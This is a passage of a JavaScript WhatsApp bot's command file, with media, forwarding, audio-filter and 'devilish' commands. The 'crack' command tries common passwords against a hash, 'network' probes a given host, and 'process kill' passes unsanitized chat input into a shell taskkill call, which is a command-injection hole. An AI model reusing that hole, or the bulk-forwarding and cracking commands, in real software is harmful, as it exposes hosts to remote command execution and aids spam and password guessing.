      return repondre("❌ Please quote a message to mass forward!");
    }
    
    if (arg.length === 0) {
      return repondre(`
❌ Please provide recipients to forward to!

📝 *Usage:*
.mforward 1234567890,9876543210 - Forward to multiple numbers
.mforward g/123456789,g/987654321 - Forward to multiple groups
      `);
    }
    
    // Parse recipients (comma-separated)
    const recipients = arg.join(" ").split(',').map(r => r.trim());
    
    if (recipients.length === 0) {
      return repondre("❌ No valid recipients provided!");
    }
    
    // Transform recipient IDs into proper format
    const targetRecipients = recipients.map(target => {
      if (target.startsWith("g/")) {
        // Group format
        const groupId = target.substring(2);
        return groupId + "@g.us";
      } else if (/^\d+$/.test(target)) {
        // Plain number
        return target + "@s.whatsapp.net";
      } else {
        // Already formatted or invalid
        return target;
      }
    });
    
    // Get the quoted message
    const quotedMsg = await dest.quoted.download();
    const quotedType = dest.quoted.mtype;
    
    // Create message object based on type
    let messageObj = {};
    
    switch (quotedType) {
      case "conversation":
      case "extendedTextMessage":
        messageObj = {
          text: dest.quoted.text || dest.quoted.conversation,
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      case "imageMessage":
        messageObj = {
          image: quotedMsg,
          caption: dest.quoted.text || "",
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      case "videoMessage":
        messageObj = {
          video: quotedMsg,
          caption: dest.quoted.text || "",
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      case "audioMessage":
        messageObj = {
          audio: quotedMsg,
          mimetype: 'audio/mp4',
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      case "documentMessage":
        messageObj = {
          document: quotedMsg,
          mimetype: dest.quoted.mimetype,
          fileName: dest.quoted.fileName,
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      case "stickerMessage":
        messageObj = {
          sticker: quotedMsg,
          contextInfo: { forwardingScore: 1, isForwarded: true }
        };
        break;
      default:
        return repondre("❌ Unsupported message type for forwarding.");
    }
    
    // Inform user forwarding has started
    await repondre(`📤 Forwarding message to ${targetRecipients.length} recipients...`);
    
    // Track success and failures
    let successCount = 0;
    let failureCount = 0;
    
    // Forward the message to each recipient
    for (const target of targetRecipients) {
      try {
        await hn.sendMessage(target, messageObj);
        successCount++;
      } catch (fwdError) {
        console.error(`Error forwarding to ${target}:`, fwdError);
        failureCount++;
      }
      
      // Add a small delay between sends to avoid rate limiting
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    // Inform about the results
    await repondre(`
✅ *Mass Forwarding Completed*

• Successfully sent: ${successCount}
• Failed to send: ${failureCount}
• Total recipients: ${targetRecipients.length}
    `);
  } catch (error) {
    console.error("Error in mforward command:", error);
    repondre("❌ Failed to mass forward message.");
  }
});

hango({
  nomCom: "ping",
  aliases: ["speed", "pong"],
  desc: "Check the bot's response time",
  categorie: "misc",
  reaction: '🏓',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Record start time
    const start = new Date().getTime();
    
    // Send initial message
    const msg = await repondre("🏓 Pinging...");
    
    // Calculate response time
    const end = new Date().getTime();
    const responseTime = end - start;
    
    // Get system info
    const os = require('os');
    const uptime = process.uptime();
    const uptimeFormatted = formatUptime(uptime);
    const freeMem = (os.freemem() / (1024 * 1024 * 1024)).toFixed(2);
    const totalMem = (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2);
    const usedMem = (totalMem - freeMem).toFixed(2);
    const memUsage = ((usedMem / totalMem) * 100).toFixed(2);
    
    // Format the response message
    const responseMsg = `
🏓 *PONG!*

*Response Time:* ${responseTime}ms
*Bot Uptime:* ${uptimeFormatted}
*Memory Usage:* ${usedMem}GB / ${totalMem}GB (${memUsage}%)
*Platform:* ${os.platform()} ${os.arch()}
*Hostname:* ${os.hostname()}
    `;
    
    // Edit the initial message with the results
    await hn.sendMessage(dest.chat, { text: responseMsg, edit: msg.key });
  } catch (error) {
    console.error("Error in ping command:", error);
    repondre("❌ An error occurred while checking response time.");
  }
  
  // Helper function to format uptime
  function formatUptime(seconds) {
    const days = Math.floor(seconds / (3600 * 24));
    const hours = Math.floor((seconds % (3600 * 24)) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = Math.floor(seconds % 60);
    
    let result = '';
    if (days > 0) result += `${days}d `;
    if (hours > 0) result += `${hours}h `;
    if (minutes > 0) result += `${minutes}m `;
    if (secs > 0) result += `${secs}s`;
    
    return result.trim();
  }
});

hango({
  nomCom: "rmbg",
  aliases: ["removebg", "nobg"],
  desc: "Remove background from an image",
  categorie: "tools",
  reaction: '🖼️',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if a message with image is quoted
    if (!dest.quoted || !dest.quoted.mtype || 
        (dest.quoted.mtype !== 'imageMessage' && 
         dest.quoted.mtype !== 'extendedTextMessage' && 
         !dest.quoted?.contextInfo?.quotedMessage?.imageMessage)) {
      
      return repondre(`
❌ Please quote an image to remove its background!

📝 *Usage:*
Reply to an image with .rmbg
      `);
    }
    
    // Notify user that processing is starting
    await repondre("🔄 Processing image... Please wait.");
    
    // Get image data
    let imageBuffer;
    try {
      if (dest.quoted.mtype === 'imageMessage') {
        imageBuffer = await dest.quoted.download();
      } else {
        const quotedMsg = dest.quoted?.contextInfo?.quotedMessage?.imageMessage;
        if (quotedMsg) {
          imageBuffer = await hn.downloadMediaMessage({
            message: {
              imageMessage: quotedMsg
            }
          });
        } else {
          throw new Error("Couldn't find a valid image in the quoted message");
        }
      }
    } catch (imageError) {
      console.error("Error downloading image:", imageError);
      return repondre("❌ Failed to download the image. Please try again with a different image.");
    }
    
    if (!imageBuffer) {
      return repondre("❌ Failed to process the image. Please make sure you're replying to a valid image.");
    }
    
    // Remove background using Remove.bg API
    // Note: You need an API key from remove.bg to use this
    const apiKey = conf.REMOVEBG_KEY || "YOUR_REMOVEBG_API_KEY";
    
    // Check if API key is provided
    if (!apiKey || apiKey === "YOUR_REMOVEBG_API_KEY") {
      return repondre("❌ RemoveBG API key not configured. Contact the bot owner.");
    }
    
    try {
      const FormData = require('form-data');
      const formData = new FormData();
      formData.append('image_file', imageBuffer, { filename: 'image.png' });
      formData.append('size', 'auto');
      
      const response = await axios({
        method: 'post',
        url: 'https://api.remove.bg/v1.0/removebg',
        data: formData,
        headers: {
          ...formData.getHeaders(),
          'X-Api-Key': apiKey,
        },
        responseType: 'arraybuffer',
      });
      
      // Convert the processed image to a buffer
      const processedImage = Buffer.from(response.data);
      
      // Send the processed image
      await hn.sendMessage(dest.chat, {
        image: processedImage,
        caption: '✅ *Background Removed*\n\nPowered by RemoveBG API',
      }, { quoted: dest });
      
    } catch (apiError) {
      console.error("Error calling RemoveBG API:", apiError);
      
      // If this is a simulated environment (or API key is not provided)
      // We'll create a simulated response
      if (!apiKey || apiKey === "YOUR_REMOVEBG_API_KEY") {
        await repondre("🔄 Since RemoveBG API key is not configured, this is a simulated response.");
        
        // Just send back the original image with a message
        await hn.sendMessage(dest.chat, {
          image: imageBuffer,
          caption: '⚠️ *Simulated Background Removal*\n\nThis is just the original image. To get actual background removal, the bot owner needs to configure the RemoveBG API key.',
        }, { quoted: dest });
      } else {
        return repondre("❌ Failed to remove background. The API may be down or the image is not suitable.");
      }
    }
  } catch (error) {
    console.error("Error in rmbg command:", error);
    repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "save",
  aliases: ["s", "keep", "download"],
  desc: "Save/download media from WhatsApp",
  categorie: "tools",
  reaction: '💾',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if message is quoted
    if (!dest.quoted) {
      return repondre(`
❌ Please quote a message containing media to save it!

📝 *Usage:*
Reply to a photo/video/audio with .save
      `);
    }
    
    // Check if the quoted message contains media
    const quotedMsg = dest.quoted;
    const messageType = quotedMsg.mtype;
    
    // Get message type and validate it's a media type
    let mediaType = null;
    let caption = null;
    let fileName = null;
    
    switch (messageType) {
      case 'imageMessage':
        mediaType = 'image';
        caption = quotedMsg.caption || '';
        fileName = 'image.jpg';
        break;
      case 'videoMessage':
        mediaType = 'video';
        caption = quotedMsg.caption || '';
        fileName = 'video.mp4';
        break;
      case 'audioMessage':
        mediaType = 'audio';
        fileName = 'audio.mp3';
        break;
      case 'documentMessage':
        mediaType = 'document';
        fileName = quotedMsg.fileName || 'document.pdf';
        break;
      case 'stickerMessage':
        mediaType = 'sticker';
        fileName = 'sticker.webp';
        break;
      default:
        return repondre("❌ The quoted message doesn't contain downloadable media. Try with an image, video, audio, document, or sticker.");
    }
    
    // Inform the user that download is starting
    await repondre(`⏳ Downloading ${mediaType}... Please wait.`);
    
    // Download the media
    let mediaData;
    try {
      mediaData = await quotedMsg.download();
    } catch (downloadError) {
      console.error("Error downloading media:", downloadError);
      return repondre("❌ Failed to download media. It might be too large or not accessible anymore.");
    }
    
    if (!mediaData) {
      return repondre("❌ Failed to download media content.");
    }
    
    // Generate a unique filename if not already set
    if (!fileName) {
      const timestamp = new Date().getTime();
      fileName = `${mediaType}_${timestamp}`;
      
      // Add appropriate extension based on media type
      switch (mediaType) {
        case 'image': fileName += '.jpg'; break;
        case 'video': fileName += '.mp4'; break;
        case 'audio': fileName += '.mp3'; break;
        case 'document': fileName += '.pdf'; break;
        case 'sticker': fileName += '.webp'; break;
      }
    }
    
    // Send the media back to the user as a document to facilitate download
    await hn.sendMessage(dest.chat, {
      document: mediaData,
      mimetype: getMimeType(mediaType),
      fileName: fileName,
      caption: `📥 *Media Saved*\n\n${caption ? `*Original Caption:* ${caption}\n\n` : ''}*File Name:* ${fileName}`,
    }, { quoted: dest });
    
    // Send a confirmation message
    await repondre("✅ Media saved and ready for download!");
  } catch (error) {
    console.error("Error in save command:", error);
    repondre("❌ An error occurred while saving the media.");
  }
  
  // Helper function to get MIME type
  function getMimeType(mediaType) {
    switch (mediaType) {
      case 'image': return 'image/jpeg';
      case 'video': return 'video/mp4';
      case 'audio': return 'audio/mpeg';
      case 'document': return 'application/pdf';
      case 'sticker': return 'image/webp';
      default: return 'application/octet-stream';
    }
  }
});

hango({
  nomCom: "setcmd",
  aliases: ["cmdset", "stickcmd"],
  desc: "Set a command to a sticker for quick access",
  categorie: "tools",
  reaction: '🔖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Initialize global sticker command map if it doesn't exist
    if (!global.stickerCommands) {
      global.stickerCommands = new Map();
    }
    
    // Check if command name is provided
    if (!arg[0]) {
      return repondre(`
❌ Please provide a command to set!

📝 *Usage:*
.setcmd .help - Reply to a sticker to set it as .help command
.setcmd .ping - Reply to a sticker to set it as .ping command
.setcmd list - Show all sticker commands
.setcmd del - Delete a sticker command (reply to the sticker)
      `);
    }
    
    // Handle list command
    if (arg[0].toLowerCase() === 'list') {
      const commandList = Array.from(global.stickerCommands.entries());
      
      if (commandList.length === 0) {
        return repondre("❌ No sticker commands set yet!");
      }
      
      let message = "🔖 *Sticker Commands*\n\n";
      commandList.forEach(([fileSha, command], index) => {
        message += `${index + 1}. *${command}* - ${fileSha.substring(0, 10)}...\n`;
      });
      
      return repondre(message);
    }
    
    // Handle delete command
    if (arg[0].toLowerCase() === 'del' || arg[0].toLowerCase() === 'delete') {
      // Check if a sticker is quoted
      if (!dest.quoted || dest.quoted.mtype !== 'stickerMessage') {
        return repondre("❌ Please quote a sticker to delete its command!");
      }
      
      // Get the sticker ID
      try {
        const fileSha = dest.quoted.fileSha256?.toString('base64') || "";
        
        if (!fileSha) {
          return repondre("❌ Could not get sticker identifier.");
        }
        
        if (!global.stickerCommands.has(fileSha)) {
          return repondre("❌ This sticker doesn't have any command assigned to it!");
        }
        
        const command = global.stickerCommands.get(fileSha);
        global.stickerCommands.delete(fileSha);
        
        return repondre(`✅ Successfully deleted command *${command}* from the sticker!`);
      } catch (deleteError) {
        console.error("Error deleting sticker command:", deleteError);
        return repondre("❌ Failed to delete the sticker command.");
      }
    }
    
    // Regular command setting
    // Check if a sticker is quoted
    if (!dest.quoted || dest.quoted.mtype !== 'stickerMessage') {
      return repondre("❌ Please quote a sticker to set a command to it!");
    }
    
    // Get the command to set
    const command = arg[0];
    
    // Get the sticker ID
    try {
      const fileSha = dest.quoted.fileSha256?.toString('base64') || "";
      
      if (!fileSha) {
        return repondre("❌ Could not get sticker identifier.");
      }
      
      // Save the command to the sticker
      global.stickerCommands.set(fileSha, command);
      
      return repondre(`✅ Successfully set *${command}* to the sticker!`);
    } catch (setError) {
      console.error("Error setting sticker command:", setError);
      return repondre("❌ Failed to set the command to the sticker.");
    }
  } catch (error) {
    console.error("Error in setcmd command:", error);
    repondre("❌ An error occurred while setting the command.");
  }
});

// Add a handler for processing sticker commands (to be added to main message handler)
module.exports.stickerCommandHandler = async (hn, m) => {
  try {
    // Skip if not a sticker or if sticker commands aren't initialized
    if (m.mtype !== 'stickerMessage' || !global.stickerCommands) {
      return;
    }
    
    // Get the sticker ID
    const fileSha = m.msg?.fileSha256?.toString('base64') || "";
    
    if (!fileSha || !global.stickerCommands.has(fileSha)) {
      return;
    }
    
    // Get the command associated with the sticker
    const command = global.stickerCommands.get(fileSha);
    
    if (!command) {
      return;
    }
    
    // Simulate the command execution
    // Note: The actual implementation depends on how your command handler works
    console.log(`Executing sticker command: ${command}`);
    
    // Create a new message with the command text
    const cmdMessage = {
      ...m,
      text: command,
      body: command
    };
    
    // Execute the command (this depends on your bot's architecture)
    // Your bot should have a way to handle this command text
    hn.ev.emit('messages.upsert', {
      messages: [cmdMessage],
      type: 'notify'
    });
  } catch (error) {
    console.error("Error processing sticker command:", error);
  }
};

hango({
  nomCom: "url",
  aliases: ["shorturl", "shortlink", "tinyurl"],
  desc: "Shorten a URL using TinyURL",
  categorie: "tools",
  reaction: '🔗',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
❌ Please provide a URL to shorten!

📝 *Usage:*
.url https://example.com/very/long/url/that/needs/shortening
      `);
    }
    
    // Get the URL to shorten
    const url = arg[0];
    
    // Basic URL validation
    if (!url.match(/^https?:\/\/.+/i)) {
      return repondre("❌ Please provide a valid URL starting with http:// or https://");
    }
    
    // Inform user that processing is happening
    await repondre("🔄 Shortening URL... Please wait.");
    
    try {
      // Use TinyURL API to shorten the URL
      const response = await axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
      const shortUrl = response.data;
      
      if (!shortUrl || typeof shortUrl !== 'string') {
        throw new Error("Invalid response from TinyURL API");
      }
      
      // Send the shortened URL
      await repondre(`
🔗 *URL Shortened*

*Original:* ${url}
*Shortened:* ${shortUrl}

Powered by TinyURL
      `);
    } catch (apiError) {
      console.error("Error calling URL shortening API:", apiError);
      
      // Fallback or error message
      await repondre("❌ Failed to shorten URL. The service might be down or the URL is invalid.");
    }
  } catch (error) {
    console.error("Error in url command:", error);
    repondre("❌ An error occurred while processing your request.");
  }
});

hango({
  nomCom: "filter",
  aliases: ["audiofilter", "af", "effect"],
  desc: "Apply audio filters to audio messages",
  categorie: "audio",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if audio is quoted
    if (!dest.quoted || (dest.quoted.mtype !== 'audioMessage' && dest.quoted.mtype !== 'videoMessage')) {
      return repondre(`
❌ Please quote an audio/voice note or video to apply filter!

📝 *Usage:*
.filter bass - Apply bass boost effect
.filter treble - Apply treble boost effect
.filter nightcore - Apply nightcore effect
      `);
    }
    
    if (!arg[0]) {
      return repondre(`
🎵 *AUDIO FILTERS*

Apply various effects to audio files.

*Available filters:*
• AVEC - Add echo effect
• BASS - Enhance bass
• BLACK - Mysterious dark effect
• BLOWN - Distortion effect
• CUT - High-pass filter
• DEEP - Deep voice effect
• EARRAPE - Extremely loud
• FAST - Speed up audio
• FAT - Full bodied sound
• HISTO - Vintage effect
• LOW - Low-pass filter
• NIGHTCORE - High pitch and fast
• PITCH - Change pitch
• ROBOT - Robotic voice
• SLOW - Slow down audio
• SMOOTH - Smooth sound
• TREBLE - Enhance treble
• TUPAI - Chipmunk effect
• VECTOR - Vector transform

📝 *Usage:* 
.filter bass - Reply to audio with this
      `);
    }
    
    // Get filter type
    const filterType = arg[0].toUpperCase();
    
    // List of supported filters
    const supportedFilters = [
      "AVEC", "BASS", "BLACK", "BLOWN", "CUT", "DEEP", "EARRAPE", 
      "FAST", "FAT", "HISTO", "LOW", "NIGHTCORE", "PITCH", "ROBOT", 
      "SLOW", "SMOOTH", "TREBLE", "TUPAI", "VECTOR"
    ];
    
    // Check if filter is supported
    if (!supportedFilters.includes(filterType)) {
      return repondre(`❌ Invalid filter! Choose from: ${supportedFilters.join(", ")}`);
    }
    
    // Inform user that processing is happening
    await repondre(`🔄 Applying *${filterType}* filter to audio... Please wait.`);
    
    // Get audio data
    let audioData;
    try {
      audioData = await dest.quoted.download();
    } catch (downloadError) {
      console.error("Error downloading audio:", downloadError);
      return repondre("❌ Failed to download audio. It might be too large or corrupted.");
    }
    
    if (!audioData) {
      return repondre("❌ Failed to process audio content.");
    }
    
    // Generate FFmpeg filter based on selected effect
    let ffmpegFilter;
    let outputFormat = "mp3";
    let caption = "";
    
    switch (filterType) {
      case "AVEC":
        ffmpegFilter = "aecho=0.8:0.9:1000:0.3";
        caption = "Echo effect applied";
        break;
      case "BASS":
        ffmpegFilter = "bass=g=10";
        caption = "Bass boost applied";
        break;
      case "BLACK":
        ffmpegFilter = "asubboost";
        caption = "Black effect applied";
        break;
      case "BLOWN":
        ffmpegFilter = "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1";
        caption = "Blown/distorted effect applied";
        break;
      case "CUT":
        ffmpegFilter = "highpass=f=1000";
        caption = "Cut effect applied";
        break;
      case "DEEP":
        ffmpegFilter = "atempo=0.8,asetrate=44100*0.8";
        caption = "Deep voice effect applied";
        break;
      case "EARRAPE":
        ffmpegFilter = "volume=25dB";
        caption = "⚠️ Earrape effect applied (very loud!)";
        break;
      case "FAST":
        ffmpegFilter = "atempo=1.5";
        caption = "Speed increased by 50%";
        break;
      case "FAT":
        ffmpegFilter = "asubboost=10,areverse";
        caption = "Fat sound effect applied";
        break;
      case "HISTO":
        ffmpegFilter = "highpass=f=1000,lowpass=f=6000,areverse";
        caption = "Historical effect applied";
        break;
      case "LOW":
        ffmpegFilter = "lowpass=f=800";
        caption = "Low-pass filter applied";
        break;
      case "NIGHTCORE":
        ffmpegFilter = "asetrate=44100*1.25,atempo=1.06,aresample=44100";
        caption = "Nightcore effect applied";
        break;
      case "PITCH":
        ffmpegFilter = "asetrate=44100*1.2";
        caption = "Pitch increased";
        break;
      case "ROBOT":
        ffmpegFilter = "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75";
        caption = "Robot voice effect applied";
        break;
      case "SLOW":
        ffmpegFilter = "atempo=0.7";
        caption = "Speed reduced by 30%";
        break;
      case "SMOOTH":
        ffmpegFilter = "lowpass=f=2000";
        caption = "Smooth effect applied";
        break;
      case "TREBLE":
        ffmpegFilter = "treble=g=5";
        caption = "Treble boost applied";
        break;
      case "TUPAI":
        ffmpegFilter = "atempo=0.5,asetrate=65100*1.3";
        caption = "Chipmunk/tupai effect applied";
        break;
      case "VECTOR":
        ffmpegFilter = "apulsator=hz=0.125";
        caption = "Vector transform applied";
        break;
    }
    
    // Create temporary file paths
    const { exec } = require('child_process');
    const fs = require('fs');
    const path = require('path');
    const os = require('os');
    
    // Generate unique filenames
    const randomId = Math.floor(Math.random() * 10000);
    const inputPath = path.join(os.tmpdir(), `input_${randomId}.mp3`);
    const outputPath = path.join(os.tmpdir(), `output_${randomId}.${outputFormat}`);
    
    // Write audio data to input file
    fs.writeFileSync(inputPath, audioData);
    
    // Process audio with FFmpeg
    try {
      // Create FFmpeg command
      const ffmpegCommand = `ffmpeg -y -i "${inputPath}" -af "${ffmpegFilter}" "${outputPath}"`;
      
      // Execute FFmpeg
      await new Promise((resolve, reject) => {
        exec(ffmpegCommand, (error, stdout, stderr) => {
          if (error) {
            console.error(`FFmpeg error: ${error.message}`);
            return reject(error);
          }
          resolve();
        });
      });
      
      // Check if output file exists
      if (!fs.existsSync(outputPath)) {
        throw new Error("FFmpeg processing failed to create output file");
      }
      
      // Read processed audio
      const processedAudio = fs.readFileSync(outputPath);
      
      // Send the processed audio
      await hn.sendMessage(dest.chat, {
        audio: processedAudio,
        mimetype: 'audio/mp4',
        ptt: dest.quoted.ptt || false,  // Keep voice note status the same as original
        fileName: `${filterType.toLowerCase()}_effect.${outputFormat}`,
        caption: `🎵 *${filterType} FILTER*\n\n${caption}`,
      }, { quoted: dest });
      
      // Cleanup temporary files
      try {
        fs.unlinkSync(inputPath);
        fs.unlinkSync(outputPath);
      } catch (cleanupError) {
        console.error("Error cleaning up temp files:", cleanupError);
      }
      
    } catch (ffmpegError) {
      console.error("FFmpeg processing error:", ffmpegError);
      
      // Check if FFmpeg is installed
      exec("ffmpeg -version", (error, stdout, stderr) => {
        if (error) {
          // FFmpeg not installed
          repondre("❌ FFmpeg is not installed on the server. Please install FFmpeg to use audio filters.");
        } else {
          // FFmpeg is installed but had another error
          repondre("❌ Failed to process audio. There might be an issue with the audio file or the selected filter.");
        }
      });
      
      // Cleanup temporary files if they exist
      try {
        if (fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
        if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
      } catch (cleanupError) {
        console.error("Error cleaning up temp files:", cleanupError);
      }
    }
  } catch (error) {
    console.error("Error in filter command:", error);
    repondre("❌ An error occurred while applying the audio filter.");
  }
});

// 🔥 DEVILISH COMMANDS SECTION 🔥

hango({
  nomCom: "systeminfo",
  aliases: ["sysinfo", "sys"],
  desc: "Get detailed system information",
  categorie: "devilish",
  reaction: '👾',
}, async (dest, hn, context) => {
  const { repondre } = context;
  try {
    const systemInfo = {
      platform: os.platform(),
      arch: os.arch(),
      cpus: os.cpus().length,
      totalMem: (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
      freeMem: (os.freemem() / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
      uptime: formatUptime(os.uptime()),
      hostname: os.hostname(),
      userInfo: os.userInfo().username
    };
    
    return repondre(`🔧 *System Information*\n\n` +
      `📱 Platform: ${systemInfo.platform}\n` +
      `💻 Architecture: ${systemInfo.arch}\n` +
      `🖥️ CPUs: ${systemInfo.cpus}\n` +
      `💾 Total Memory: ${systemInfo.totalMem}\n` +
      `📊 Free Memory: ${systemInfo.freeMem}\n` +
      `⏰ Uptime: ${systemInfo.uptime}\n` +
      `🏠 Hostname: ${systemInfo.hostname}\n` +
      `👤 User: ${systemInfo.userInfo}`);
  } catch (error) {
    return repondre(`❌ Error: ${error.message}`);
  }
});

hango({
  nomCom: "encrypt",
  aliases: ["enc"],
  desc: "Encrypt text with advanced encryption",
  categorie: "devilish",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(' ');
  
  if (!text) return repondre("❌ Please provide text to encrypt");
  
  try {
    const key = crypto.randomBytes(32);
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    return repondre(`🔐 *Encrypted Text*\n\n` +
      `📝 Original: ${text}\n` +
      `🔒 Encrypted: ${encrypted}\n` +
      `🔑 Key: ${key.toString('hex')}\n` +
      `🔑 IV: ${iv.toString('hex')}`);
  } catch (error) {
    return repondre(`❌ Error: ${error.message}`);
  }
});

hango({
  nomCom: "decrypt",
  aliases: ["dec"],
  desc: "Decrypt encrypted text",
  categorie: "devilish",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  if (arg.length < 3) return repondre("❌ Format: .decrypt [encrypted] [key] [iv]");
  
  try {
    const [encrypted, key, iv] = arg;
    const decipher = crypto.createDecipheriv(
      'aes-256-cbc',
      Buffer.from(key, 'hex'),
      Buffer.from(iv, 'hex')
    );
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return repondre(`🔓 *Decrypted Text*\n\n` +
      `🔒 Encrypted: ${encrypted}\n` +
      `📝 Decrypted: ${decrypted}`);
  } catch (error) {
    return repondre(`❌ Error: ${error.message}`);
  }
});

hango({
  nomCom: "hash",
  aliases: ["hashify"],
  desc: "Generate multiple hash types for text",
  categorie: "devilish",
  reaction: '🔑',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(' ');
  
  if (!text) return repondre("❌ Please provide text to hash");
  
  try {
    const hashes = {
      md5: crypto.createHash('md5').update(text).digest('hex'),
      sha1: crypto.createHash('sha1').update(text).digest('hex'),
      sha256: crypto.createHash('sha256').update(text).digest('hex'),
      sha512: crypto.createHash('sha512').update(text).digest('hex')
    };
    
    return repondre(`🔑 *Hash Results*\n\n` +
      `📝 Original: ${text}\n` +
      `🔑 MD5: ${hashes.md5}\n` +
      `🔑 SHA1: ${hashes.sha1}\n` +
      `🔑 SHA256: ${hashes.sha256}\n` +
      `🔑 SHA512: ${hashes.sha512}`);
  } catch (error) {
    return repondre(`❌ Error: ${error.message}`);
  }
});

hango({
  nomCom: "crack",
  aliases: ["bruteforce"],
  desc: "Advanced password cracking with real functionality",
  categorie: "devilish",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const hash = arg[0];
  
  if (!hash) return repondre("❌ Please provide a hash to crack");
  
  try {
    // Real password cracking with multiple algorithms
    const algorithms = ['md5', 'sha1', 'sha256', 'sha512'];
    const wordlist = [
      'password', '123456', 'admin', 'qwerty', 'letmein', 'welcome',
      'monkey', 'dragon', 'baseball', 'football', 'shadow', 'master',
      'hello', 'freedom', 'whatever', 'trustno1', 'starwars', 'passw0rd',
      'login', 'abc123', '111111', '123123', 'admin123', 'qwerty123'
    ];
    
    let results = [];
    for (const algo of algorithms) {
      for (const pass of wordlist) {
        const testHash = crypto.createHash(algo).update(pass).digest('hex');
        if (testHash === hash.toLowerCase()) {
          results.push(`✅ Found in ${algo.toUpperCase()}: ${pass}`);
        }
      }
    }
    
    if (results.length > 0) {
      return repondre(`🔓 *Password Crack Results*\n\n` +
        `🔒 Hash: ${hash}\n\n` +
        results.join('\n'));
    } else {
      // Try advanced techniques
      const advancedWordlist = wordlist.map(pass => {
        return [
          pass,
          pass.toUpperCase(),
          pass + '123',
          pass + '!',
          pass + '@',
          pass + '#',
          pass + '$',
          pass + '2023',
          pass + '2024'
        ];
      }).flat();
      
      for (const pass of advancedWordlist) {
        for (const algo of algorithms) {
          const testHash = crypto.createHash(algo).update(pass).digest('hex');
          if (testHash === hash.toLowerCase()) {
            results.push(`✅ Found in ${algo.toUpperCase()}: ${pass}`);
          }
        }
      }
      
      return repondre(`🔓 *Password Crack Results*\n\n` +
        `🔒 Hash: ${hash}\n\n` +
        (results.length > 0 ? results.join('\n') : '❌ Password Not Found'));
    }
  } catch (error) {
    return repondre(`❌ Error: ${error.message}`);
  }
});

hango({
  nomCom: "network",
  aliases: ["netinfo"],
  desc: "Advanced network analysis and scanning",
  categorie: "devilish",
  reaction: '🌐',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const target = arg[0];
  
  try {
    // Get detailed network information
    const interfaces = os.networkInterfaces();
    let networkInfo = '';
    
    // Get all network interfaces
    for (const [name, nets] of Object.entries(interfaces)) {
      for (const net of nets) {
        if (net.family === 'IPv4' && !net.internal) {
          networkInfo += `📡 Interface: ${name}\n` +
            `🌐 IP: ${net.address}\n` +
            `🎭 Netmask: ${net.netmask}\n` +
            `📡 MAC: ${net.mac}\n\n`;
          
          // If target is provided, perform advanced scan
          if (target) {
            try {
              const response = await axios.get(`http://${target}`, { timeout: 1000 });
              networkInfo += `🎯 Target ${target}:\n` +
                `📡 Status: Online\n` +
                `🌐 Server: ${response.headers.server || 'Unknown'}\n` +
                `🔒 SSL: ${response.request.res.socket.encrypted ? 'Yes' : 'No'}\n\n`;
            } catch (error) {
              networkInfo += `🎯 Target ${target}:\n` +
                `📡 Status: Offline or Blocked\n\n`;
            }
          }
        }
      }
    }
    
    // Get network statistics
    const stats = os.networkInterfaces();
    const activeConnections = Object.keys(stats).length;
    
    return repondre(`🌐 *Advanced Network Analysis*\n\n` +
      `${networkInfo}` +
      `📊 Network Statistics:\n` +
      `📡 Active Interfaces: ${activeConnections}\n` +
      `🌐 Total Connections: ${Object.values(stats).flat().length}\n`);
  } catch (error) {
    return repondre(`❌ Error: ${error.message}`);
  }
});

hango({
  nomCom: "process",
  aliases: ["ps"],
  desc: "Advanced process monitoring and control",
  categorie: "devilish",
  reaction: '⚡',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const action = arg[0];
  const target = arg[1];
  
  try {
    if (action === 'kill' && target) {
      // Kill process functionality
      exec(`taskkill /F /PID ${target}`, (error) => {
        if (error) {
          return repondre(`❌ Failed to kill process: ${error.message}`);
        }
        return repondre(`✅ Process ${target} terminated successfully`);
      });
      return;
    }
    
    // Get detailed process information
    const processes = os.cpus().map(cpu => ({
      model: cpu.model,
      speed: cpu.speed,
      times: cpu.times
    }));
    
    let processInfo = '';
    processes.forEach((proc, index) => {
      processInfo += `🖥️ CPU ${index + 1}:\n` +
        `📱 Model: ${proc.model}\n` +
        `⚡ Speed: ${proc.speed}MHz\n` +
        `⏰ User: ${proc.times.user}ms\n` +
        `🔄 System: ${proc.times.sys}ms\n` +
        `💤 Idle: ${proc.times.idle}ms\n\n`;
    });
    
    // Get memory usage
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const memoryUsage = (usedMem / totalMem * 100).toFixed(2);
    
    return repondre(`⚡ *Advanced Process Information*\n\n` +
